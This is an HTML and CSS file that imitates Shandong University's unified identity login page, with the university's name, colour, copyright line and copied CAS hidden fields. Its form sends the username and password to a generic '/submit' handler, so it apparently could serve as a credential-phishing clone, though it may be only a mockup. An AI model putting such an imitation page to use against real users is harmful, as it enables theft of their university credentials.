<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>山东大学统一身份认证平台</title>
    <style>
        html, body {
            height: 100%;
            margin: 0;
            padding: 0;
            background: url('login_container_bg_04.jpg') no-repeat center center fixed;
            background-size: cover;
            font-family: "Microsoft YaHei", sans-serif;
        }

        .login-container {
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .login-box {
            width: 800px;
            height: 500px;
            background-color: rgba(255, 255, 255, 0.9);
            border-radius: 5px;
            display: flex;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
        }

        .login-image {
            width: 50%;
            height: 100%;
            background: url('4d6255e1-d115-4e46-b9ab-d051e68a65b9.png') no-repeat center center;
            background-size: 60%;
            border-radius: 5px 0 0 5px;
            background-color: #f5f5f5;
        }

        .login-form {
            width: 50%;
            padding: 40px;
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        .login-title {
            text-align: center;
            font-size: 24px;
            margin-bottom: 30px;
            color: #333;
            font-weight: bold;
        }

        .input-group {
            margin-bottom: 20px;
        }

        .login-input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
            transition: border-color 0.3s;
        }

        .login-input:focus {
            border-color: #1a73e8;
            outline: none;
        }

        .login-btn {
            width: 100%;
            padding: 12px;
            background-color: #d7000f; /* 山大红 */
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.3s;
        }

        .login-btn:hover {
            background-color: #b5000d;
        }

        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <div class="login-image"></div>
            <div class="login-form">
                <div class="login-title">山东大学统一身份认证平台</div>
                <form id="loginForm" action="/submit" method="post" onsubmit="return validateForm()">
                    <div class="input-group">
                        <input class="login-input" id="un" name="username" tabindex="1" value="" autocomplete="off" placeholder="用户名/职工号/学号" required>
                    </div>
                    <div class="input-group">
                        <input class="login-input" id="pd" name="password" tabindex="2" type="password" autocomplete="off" placeholder="密码" required>
                    </div>
                    <input type="hidden" name="lt" value="LT-35550-boLLqNtFLh3eibKACVXedeZXtDigsS-cas">
                    <input type="hidden" name="execution" value="e1s1">
                    <input type="hidden" name="_eventId" value="submit">
                    <button type="submit" class="login-btn">登录</button>
                </form>
                <div class="footer">
                    <p>推荐使用Chrome、Firefox、Edge等现代浏览器</p>
                    <p>© 山东大学信息化工作办公室</p>
                </div>
            </div>
        </div>
    </div>

    <script>
        function validateForm() {
            const username = document.getElementById('un').value;
            const password = document.getElementById('pd').value;

            if (!username || !password) {
                alert('请输入用户名和密码');
                return false;
            }

            // 这里可以添加额外的验证逻辑
            return true;
        }

        // 防止表单被多次提交
        document.getElementById('loginForm').addEventListener('submit', function() {
            const btn = this.querySelector('button[type="submit"]');
            btn.disabled = true;
            btn.textContent = '登录中...';
        });
    </script>
</body>
</html>
